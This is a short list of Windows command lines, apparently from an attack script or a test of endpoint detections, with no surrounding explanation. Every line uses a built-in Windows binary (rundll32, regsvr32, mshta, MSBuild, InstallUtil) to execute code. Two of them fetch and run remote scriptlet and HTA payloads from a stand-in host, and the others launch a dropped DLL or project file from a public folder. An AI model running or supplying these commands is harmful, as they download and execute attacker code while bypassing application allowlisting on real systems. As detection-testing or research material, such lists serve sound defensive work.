rundll32.exe C:\Users\Public\a.dll,Start
regsvr32.exe /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll
mshta http://203.0.113.10/a.hta
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Users\Public\build_20261020_101200.xml
cmd.exe /c "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /U C:\Users\Public\a.dll"
